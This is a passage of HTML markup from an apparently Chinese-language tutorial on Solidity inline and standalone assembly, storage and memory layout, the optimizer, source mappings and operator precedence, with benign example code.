class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果访问的变量的类型跨度小于256位(例如uint64、address、bytes16或byte)，则不能对不属于类型编码的位进行任何假设。尤其是，不要假设它们为零。为了安全起见，在重要的上下文中使用数据之前，请务必正确地清除数据：<code>uint32 x=f();assembly x：=and(x,0xffffffff) /*现在使用x*/</code> 清除签名类型，可以使用signextend的opcode。  </p>
<blockquote>
<p>对Label的支持从0.5.0后被移除，只能使用function或者loop，而不能使用万恶的goto。  </p>
</blockquote>
<p>&emsp;&emsp;你可以使用let关键字声明一个之在汇编内可见的局部变量，并且之在当前的代码块内可见。let指令将会新建一个栈的slot来存储变量并且代码块结束时自动移除。你需要为他提供一个初始化值，否则他默认为0。当然你可以按照更复杂的函数式来实现。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint b</span>) </span>&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> v := add(x, <span class="number">1</span>)</span><br><span class="line">            mstore(<span class="number">0x80</span>, v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">let</span> y := add(sload(v), <span class="number">1</span>)</span><br><span class="line">                b := y</span><br><span class="line">            &#125; <span class="comment">// y is "deallocated" here</span></span><br><span class="line">            b := add(b, v)</span><br><span class="line">        &#125; <span class="comment">// v is "deallocated" here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将汇编的局部变量复制给函数的局部变量是可行的，需要注意的是，在将storage或memory类型的指针复制给变量时要格外小心，你只会修改指针而不会修改变量。<br>变量只能被赋予一个确切值，假如你要获得一个多返回值函数的返回值，那么你需要提供多个变量。  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    let v := 0</span><br><span class="line">    let g := add(v, 2)</span><br><span class="line">    function f() -&gt; a, b &#123; &#125;</span><br><span class="line">    let c, d := f()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;if语句条件执行，但是没有”else”的部分。如果你想提供多重选择，你可以考虑使用switch语句。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> eq(value, <span class="number">0</span>) &#123; revert(<span class="number">0</span>, <span class="number">0</span>) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>程序体需要大括号</p>
</blockquote>
<p>&emsp;&emsp;你可以使用switch语句来实现基本的”if/else”语句，你可以使用 <strong>default </strong>关键字来声明一个fallback或者默认选项。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">switch</span> calldataload(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> &#123;</span><br><span class="line">        x := calldataload(<span class="number">0x24</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span> &#123;</span><br><span class="line">        x := calldataload(<span class="number">0x44</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sstore(<span class="number">0</span>, div(x, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>switch块不需要大括号，但是每个case需要大括号。  </p>
</blockquote>
<p>&emsp;&emsp;汇编支持for风格的循环，他包含一个初始化部分，一个条件判断部分和一个迭代部分。条件判断部分必须使用函数风格，而另外两个部分则使用代码块，若初始化部分声明了某些变量，那么他们的作用与将延伸值循环体内(包括条件判断与迭代部分)。  </p>
<p>&emsp;&emsp;以下例子是计算一片内存的和：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> &#123; <span class="keyword">let</span> i := <span class="number">0</span> &#125; lt(i, <span class="number">0x100</span>) &#123; <span class="attr">i</span> := add(i, <span class="number">0x20</span>) &#125; &#123;</span><br><span class="line">        x := add(x, mload(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当然，你也可以用他来实现while风格：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> x := <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> i := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> &#123; &#125; lt(i, <span class="number">0x100</span>) &#123; &#125; &#123;     <span class="comment">// while(i &lt; 0x100)</span></span><br><span class="line">        x := add(x, mload(i))</span><br><span class="line">        i := add(i, <span class="number">0x20</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;汇编也支持低级函数的定义，参数和返回地址来自栈，返回值也将布置到栈上，调用一个函数看起来像执行一段函数类型opcode。函数可以被定义在任意位置，其可视范围是所定义的代码块，在函数体内你不能访问外部的变量，而且函数没有显示的return语句。  </p>
<blockquote>
<p>如果你的函数有多个返回值，那么你需要将他们复制给一个元组(即多个变量)  </p>
</blockquote>
<p>&emsp;&emsp;下面的示例通过平方和乘法实现幂函数：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">power</span>(<span class="params">base, exponent</span>) -&gt; <span class="title">result</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> exponent</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="attr">result</span> := <span class="number">1</span> &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span> &#123; <span class="attr">result</span> := base &#125;</span><br><span class="line">        <span class="keyword">default</span> &#123;</span><br><span class="line">            result := power(mul(base, base), div(exponent, <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">switch</span> mod(exponent, <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span> &#123; <span class="attr">result</span> := mul(base, result) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Solidity 中的转换(Conventions in Solidity)  </li>
</ul>
<p>&emsp;&emsp;与EVM汇编相比，Solidity有些类型不足256位，为了使计算更有效，EVM通常将他们以256为来对待，强行把它们放在一个slot内，而高阶位元只在必要时才会被清理，就在它们被写入内存或执行比较之前不久。所以如果你想要使用内联汇编来访问他们的话，你必须手动清零高位。<br>&emsp;&emsp;solidity以一种非常简单的方式管理内存：内存中的位置0x40处有一个“空闲内存指针”。如果要分配内存，只需使用从指针指向的位置开始的内存，并相应地更新它。但我们无法保证内存之前没有被使用过，所以你不能假设他的初始内容是0。没有内置的内存释放或回收机制，下面是一个内存分配的例子：    </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params">length</span>) -&gt; <span class="title">pos</span> </span>&#123;</span><br><span class="line">  pos := mload(<span class="number">0x40</span>)</span><br><span class="line">  mstore(<span class="number">0x40</span>, add(pos, length))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;前64个字节的内存可以用作短期分配的“临时空间”。储存空闲内存指针后的32个字节(即从0x60开始)应永久为零，并用作空动态内存数组的初始值。这意味着可分配内存从0x80开始，这是可用内存指针的初始值。    </p>
<p>&emsp;&emsp;solidity中memory数组中的元素总是占用32字节的倍数(是的，对于byte[]甚至是这样，但对于bytes和string则不是这样)。多维memory数组是指向memory数组的指针。动态数组的长度存储在数组的第一个solt(第一个32byte)中，然后是数组元素。  </p>
<blockquote>
<p>静态大小的memory数组没有长度字段，但日后可能会添加该字段，以便在静态大小的数组和动态大小的数组之间实现更好的可转换性，因此请不要依赖于此。  </p>
</blockquote>
<ul>
<li>独立汇编(Standalone Assembly)  </li>
</ul>
<p>&esmp;&emsp;独立汇编是区块链逆向的基础，我们直接来感受一下吧：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint y</span>) </span>&#123;</span><br><span class="line">    y = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; x; i++)</span><br><span class="line">      y = <span class="number">2</span> * y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;对应汇编如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  mstore(0x40, 0x80)	 // 储存    &quot;空闲memory指针”</span><br><span class="line">  </span><br><span class="line">  // 函数调度器，注意这里的运行方式</span><br><span class="line">  switch div(calldataload(0), exp(2, 226))</span><br><span class="line">  case 0xb3de648b &#123;</span><br><span class="line">    let r := f(calldataload(4))</span><br><span class="line">    let ret := $allocate(0x20)</span><br><span class="line">    mstore(ret, r)</span><br><span class="line">    return(ret, 0x20)</span><br><span class="line">  &#125;</span><br><span class="line">  default &#123; revert(0, 0) &#125;</span><br><span class="line">  // 内存分配器</span><br><span class="line">  function $allocate(size) -&gt; pos &#123;</span><br><span class="line">    pos := mload(0x40)</span><br><span class="line">    mstore(0x40, add(pos, size))</span><br><span class="line">  &#125;</span><br><span class="line">  // 合约函数部分</span><br><span class="line">  function f(x) -&gt; y &#123;</span><br><span class="line">    y := 1</span><br><span class="line">    for &#123; let i := 0 &#125; lt(i, x) &#123; i := add(i, 1) &#125; &#123;</span><br><span class="line">      y := mul(2, y)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意</p>
<blockquote>
<p>函数的调度是通过一个16位字节码来实现的，即上例的switch/case部分，switch的操作就是将调用地址转化成一个16位字节码，若调用地址与某函数字节码对应，则调至该函数，这一步分在区块链逆向中十分常见。  </p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;关于汇编的语法我不想多将，其更重要的是EVM的运行机制，我们会在后面进行说明。</p>
<h3 id="4-杂项-Miscellaneous"><a href="#4-杂项-Miscellaneous" class="headerlink" title="4. 杂项(Miscellaneous)"></a>4. 杂项(Miscellaneous)</h3><ul>
<li>状态变量的内存布局  </li>
</ul>
<p>&emsp;&emsp;固定大小的变量(除了mapping和动态数组)都存储在从0开始的连续区域内，多个少于32字节的连续对象将按照一下规则被打包在一个slot内：  </p>
<ol>
<li>slot中的第一个对象是低阶对齐的  </li>
<li>基本类型只消耗存储他们所必须的字节</li>
<li>若slot中剩下的空间不足储存一个基本类型，那么他将被存储到下一个slot  </li>
<li>结构和数组总是占据一个新的slot并占据整个slot，但是其中的数据将符合这些规则  </li>
</ol>
<p>&emsp;&emsp;当使用的变量小于32字节时，你的合约将消耗更多的gas。因为EVM一次对32字节进行操作，因此如果变量小于32字节，EVM必须执行更多的指令，将元素从32字节减小到所需大小。<br>&emsp;&emsp;只有当处理storage类型的变量是减小参数的大小才是有益的，因为编译器将把多个元素打包到一个slot内，从而将多次读写结合在一个操作内。当处理函数参数或者memory类型的变量时，这并没有什么增益，因为编译器并不会将他们打包。<br>&emsp;&emsp;为了确保EVM能够对此优化，你应当保证storage类型的变量能够被紧密的打包，例如，声明storage变量<code>uint128, uint128, uint256</code>将会比<code>uint128, uint 256, uint128</code>更加有效，因为前者占用两个slot而后者占用三个。  </p>
<blockquote>
<p>struct和mapping中的元素将彼此紧挨着存在一起，就好像他们已经被显示的给定。</p>
</blockquote>
<ul>
<li>映射与动态数组(Mappings and Dynamic Arrays)  </li>
</ul>
<p>&emsp;&emsp;由于映射与动态数组大小的不可预测性，通常情况下使用keccak-256的hash来计算值的起始位置或者查找数组的值，这些起始位置总是占据一个slot。  </p>
<p>&emsp;&emsp;根据以上规则，映射与动态数组本身将在storage的p处占据一个slot。对于动态数组来说，这个slot(即数组指针的位置)将用来储存该数组的大小。对于映射来说，这个slot将是空的(但这是必要的，以便两个相等的映射具有不同的hash分布)。数组的数据将被出存在keccak256(p)处，而映射键k所对应的值p将出存在keccak256(k.p)处，若所对应的值仍为非基本类型，则其储存位置为keccak256(k.p)加一个偏移。  </p>
<p>&emsp;&emsp;例如以下合约片段：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">  struct s &#123; uint a; uint b; &#125;</span><br><span class="line">  uint x;</span><br><span class="line">  mapping(<span class="function"><span class="params">uint</span> =&gt;</span> mapping(<span class="function"><span class="params">uint</span> =&gt;</span> s)) data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>data[4][9].b的位置在 keccak256(uint256(9).keccak256(uint256(4).uint256(1))) + 1</p>
</blockquote>
<ul>
<li>二进制数组与字符串(Bytes and String)  </li>
</ul>
<p>&emsp;&emsp;bytes和string将会被完全相同地编码。对于 <code>short byte arrays</code> 长度和数据将会被出存在同一个slot内。特别地：如果数据最长为 31 bytes，    那么数据将会存储在高阶字节中(左对齐)，最低阶字节存储 <code>length * 2</code> 。对于存储32或更长字节的数组，主slot将存储 <code>length * 2  +1</code>,数据通常存储在 <code>keccak256(slot)</code> 中。这意味着你可以通过检查是否设置了低位来区分长数组与短数组：短数组(未设置) 长数组(设置)  </p>
<blockquote>
<p>处理非法编码的插槽目前并不支持，但日后可能会增加。  </p>
</blockquote>
<ul>
<li>内存布局(Layout in Memory)  </li>
</ul>
<p>&emsp;&emsp;solidity保留4个32-bytes的slot，具体范围与使用目的如下：  </p>
<ul>
<li><code>0x00</code> - <code>0x3f</code>(64字节)：哈希运算的草稿(scratch)空间，即临时空间  </li>
<li><code>0x40</code> - <code>0x5f</code>(32字节)：当前分配的内存大小(空闲内存指针)</li>
<li><code>0x60</code> - <code>0x7f</code>(32字节)：零插槽(Zero slot)  </li>
</ul>
<p>&emsp;&emsp;可以在语句之间使用Strach空间(即内联汇编)。零插槽用于给动态数组初始化，永远都不应被写入，因此空闲内存指针z最初指向 <code>0x80</code>。  </p>
<p>&emsp;&emsp;Solidity总是将新的对象放置于空闲内存指针上，并且内存将永远不会释放(这在以后可能会改变)。  </p>
<blockquote>
<p>Solidity中可能有一些操作会使用超出64字节的临时空间(Scratch)，他们将会被分配到空闲内存指针指向的位置，但是给予其较短的生命周期，而且指针本身不会更新，因此该内存可能为零也可能不为零。所以，我们不应当认为空闲内存是默认置零的。<br>看起来使用 <code>msize</code> 来获得一个确定的置零空闲内存是个不错的选择，然而，如果不更新此指针，将其作为非临时指针使用的话可能带来负面效果，原理同上。  </p>
<blockquote>
<p>注：<code>msize</code>的作用为获得当前最大可索引空间的大小，即空闲指针。  </p>
</blockquote>
</blockquote>
<ul>
<li>调用数据布局(Layout of Call Data)  </li>
</ul>
<p>&emsp;&emsp;函数调用时的数据将被假定为ABI规范定义的格式。其中，ABI规范要求将参数填充为32字节的倍数。Internal类型的函数调用使用不同的约定。  </p>
<p>&emsp;&emsp;合约构造函数的参数将会直接附加在合约代码的末尾，也使用ABI编码。构造函数将使用硬编码偏移量来访问他们，而非使用 <code>codesize</code> 的操作码，因为当数据附加到代码时，其将会发生改变。</p>
<ul>
<li>内部–清理变量(Internals-Cleaning Up Variables)  </li>
</ul>
<p>&emsp;&emsp;当一个值小于256位时，在某些情况下必须清空剩余的位。Solidity编译器将会在这些多余的垃圾位产生不利影响之前将其清空。例如，再将数据写入内存之前，剩余位需要被清空，因为这些位可能会造成数据紊乱。  </p>
<p>&emsp;&emsp;另一方面，如果后续操作不受影响，我们将不会立即清理位。例如，由于 <code>Jumpi</code> 指令认为任何非零值都为真，因此在讲布尔值用作Jumpi条件之前我们不会清空这些值。  </p>
<p>&emsp;&emsp;除了以上设计原则之外，Solidity编译器将在数据加载到堆栈上时清空输入数据。不同数据的类型具有不同的清空规则：  </p>
<table>
<thead>
<tr>
<th style="text-align:left">类型(Type)</th>
<th style="text-align:center">有效值</th>
<th style="text-align:left">无效值导致的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">n个成员的枚举</td>
<td style="text-align:center">0到n-1</td>
<td style="text-align:left">异常</td>
</tr>
<tr>
<td style="text-align:left">布尔</td>
<td style="text-align:center">0或1</td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td style="text-align:left">有符号整数</td>
<td style="text-align:center">符号扩展字</td>
<td style="text-align:left">目前会直接打包；将来会抛出异常</td>
</tr>
<tr>
<td style="text-align:left">无符号整数</td>
<td style="text-align:center">高位补0</td>
<td style="text-align:left">目前会直接打包；将来会抛出异常</td>
</tr>
</tbody>
</table>
<ul>
<li>内部优化(Internals-The Optimiser)  </li>
</ul>
<p>&emsp;&emsp;Solidity 优化器是在汇编语言级别工作的，所以它可以并且也被其他语言所使用。它通过 <code>JUMP</code> 和 <code>JUMPDEST</code> 语句将指令集序列分割为基础的代码块。在这些代码块内的指令集会被分析，并且对堆栈、内存或存储的每个修改都会被记录为表达式，这些表达式由一个指令和基本上是指向其他表达式的参数列表所组成。这个优化器使用一个叫做“CommonSubexpressionEliminator”的组件lai，在其他任务中，找到恒等的表达式，并将它们组合到一个表达式类中，优化器将将首先尝试在已知表达式中查询新的表达式。如果没有找到，表达式将会按照 <code>constant + constant = sum_of_constants</code> 或者 <code>x * 1 = x</code> 的规则进行简化。由于这是一个递归的执行过程，因此，如果我们知道一个复杂的表达式恒等于1时，我们可以应用第二条规则。对于storage和memory具体位置的修改必须删除有关storage与memory位置的认知(Knowledge)，这里的区别我们并不清楚：假如我们先在x位置写入，然后在y位置写入，并且两者都是输入变量，那么第二个变量将会覆盖第一个，因此在y写入后我们并不知道x中储存了什么。如果表达式 <code>x-y</code> 的简化结果为非零常量，那么我们知道我们可以保持对x中存储内容的认知。  </p>
<p>&emsp;&emsp;在这个过程之后，我们知道哪些表达式必须在栈的末尾，并有一个对内存和存储的修改列表。这些信息与基本块一起存储，并用于链接它们。此外，有关堆栈、存储和内存配置的知识将转发到下一个块。如果我们知道所有 <code>JUMP</code> 和 <code>JUMPI</code>的目标，我们就可以建立一个完整的程序控制流程图。如果只有一个我们不知道的目标(原则上这可以发生，跳跃目标可以从输入中计算)，我们必须清除有关块输入状态的所有认知，因为它可能是未知跳跃的目标。如果优化器找到一个条件值为常量的 <code>Jumpi</code>，它会将其转换为无条件的 <code>Jumpi</code>。  </p>
<p>&emsp;&emsp;最后一步是重新生成每个块中的代码。优化器从块末尾堆栈上的表达式创建依赖关系图，并删除不属于此图的每个操作。它生成的代码按照原始代码的顺序将修改应用于内存和存储(删除发现不需要的修改)。最后，它生成所有需要在堆栈上正确位置的值。  </p>
<p>&emsp;&emsp;这些步骤应用于每个基本块，如果新生成的代码较小，则将其用作替换代码。如果在 <code>Jumpi</code> 处拆分基本块，并且在分析过程中，条件评估为常量，则根据常量的值替换 <code>Jumpi</code>。例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint x = <span class="number">7</span>;</span><br><span class="line">data[<span class="number">7</span>] = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">if</span> (data[x] != x + <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>简化后：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">7</span>] = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>源码映射(Source Mappings)  </li>
</ul>
<p>&emsp;&emsp;作为AST输出的一部分，编译器提供由AST中的各个节点表示的源代码范围。这可以用于各种用途，从基于AST报告错误的静态分析工具，到突出显示局部变量及其用途的调试工具。  </p>
<p>&emsp;&emsp;此外，编译器还可以生成从字节码到生成指令的源代码范围的映射。这对于在字节码级别上操作的静态分析工具以及在调试器内显示源代码中的当前位置或处理断点来说十分重要。  </p>
<p>&emsp;&emsp;这两种源映射都使用整数标识符来引用源文件。源文件的标识符存储在输出[‘sources’][sourcename][‘id’]中，其中output是解析为JSON的标准JSON编译器接口的输出。  </p>
<blockquote>
<p>对于不与任何特定源文件关联的指令，源映射将分配一个-1的整数标识符。对于源自编译器生成的内联汇编语句的字节码部分，可能会发生这种情况。  </p>
</blockquote>
<p>AST内的源映射使用以下表示法：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:l:f</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中s是到源文件中范围开头的字节偏移量，l是源范围的长度（以字节为单位），f是上面提到的源索引。   </p>
<p>&emsp;&emsp;字节码的源映射中的编码更加复杂：它是由 <code>;</code> 分隔的 <code>s:l:f:j</code> 列表。这些元素中的每一个都对应于一条指令，即不能使用字节偏移量，但必须使用指令偏移量（推送指令比单个字节长）。字段 <code>s</code> ,<code>l</code> 和f如上所述，<code>j</code>可以是 <code>i</code> ,<code>o</code> 或 <code>-</code> 表示跳转指令是进入函数、从函数返回还是作为循环的一部分的常规跳转。</p>
<p>为了压缩这些源映射，尤其是字节码映射，使用以下规则：  </p>
<ul>
<li><p>如果字段为空，则使用前面元素的值。  </p>
</li>
<li><p>如果缺少a:，则以下所有字段都视为空。  </p>
</li>
</ul>
<p>这意味着以下源映射表示相同的信息：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:2:1;1:9:1;2:1:2;2:1:2;2:1:2</span><br><span class="line"></span><br><span class="line">1:2:1;:9;2:1:2;;</span><br></pre></td></tr></table></figure>
<ul>
<li>技巧与窍门(Tips and Tricks)  </li>
</ul>
<ul>
<li><p>对数组使用 <code>delete</code> 来清空其所有元素</p>
</li>
<li><p>对struct中的元素使用较短的数据类型，并且对他们排序，以便将较短的类型打包在一个slot中来消耗更少的gas  </p>
</li>
<li><p>确保state变量为public类型，编译器将为你自动生成一个getter  </p>
</li>
<li><p>如果你最终需要在函数开始位置检查很多输入条件或者状态变量的值，你可以尝试使用装饰器(Modifier)  </p>
</li>
<li><p>如果你的合约有一个 <code>send</code> 函数，但你想要使用内置的 send 函数，你可以使用 <code>address(contractVariable).send(amount)</code>  </p>
</li>
<li><p>使用一个赋值语句就可以初始化 struct：x = MyStruct({a: 1, b: 2});  </p>
</li>
</ul>
<blockquote>
<p>如果存储结构具有紧密打包(Tightly packed)的属性，请使用单独的赋值对其进行初始化：<code>x.a=1;x.b=2;</code>。这样，优化器一次更新存储将更容易，从而使分配开销更小。  </p>
</blockquote>
<ul>
<li>速查表(Cheatsheet)  </li>
</ul>
<p>&emsp;&emsp;运算符顺序优先级排序，以下是按计算顺序列出的运算符的优先顺序。  </p>
<table>
<thead>
<tr>
<th style="text-align:left">优先</th>
<th style="text-align:center">描述</th>
<th style="text-align:left">算符</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">后置自增和自减</td>
<td style="text-align:left"><code>++，--</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">创建类型实例</td>
<td style="text-align:left"><code>new &lt;typename&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">数组元素</td>
<td style="text-align:left"><code>&lt;array&gt;[&lt;index&gt;]</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">访问成员</td>
<td style="text-align:left"><code>&lt;object&gt;.&lt;member&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">函数调用</td>
<td style="text-align:left"><code>&lt;func&gt;(&lt;args...&gt;)</code></td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:center">小括号</td>
<td style="text-align:left"><code>(&lt;statement&gt;)</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">前置自增和自减</td>
<td style="text-align:left"><code>++, --</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">一元运算的加和减</td>
<td style="text-align:left"><code>+,-</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">一元操作符</td>
<td style="text-align:left"><code>delete</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">逻辑非</td>
<td style="text-align:left"><code>!</code></td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:center">按位非</td>
<td style="text-align:left"><code>~</code></td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:center">乘方</td>
<td style="text-align:left"><code>**</code></td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:center">乘、除和模运算</td>
<td style="text-align:left"><code>*, /, %</code></td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:center">算术加和减</td>
<td style="text-align:left"><code>+, -</code></td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:center">移位操作符</td>
<td style="text-align:left"><code>&lt;&lt;, &gt;&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:center">按位与</td>
<td style="text-align:left"><code>&amp;</code></td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:center">按位异或</td>
<td style="text-align:left"><code>^</code></td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:center">按位或</td>
<td style="text-align:left">`</td>
<td>`</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:center">非等操作符</td>
<td style="text-align:left"><code>&lt;, &gt;, &lt;=, &gt;=</code></td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:center">等于操作符</td>
<td style="text-align:left"><code>==, !=</code></td>
</tr>
<tr>
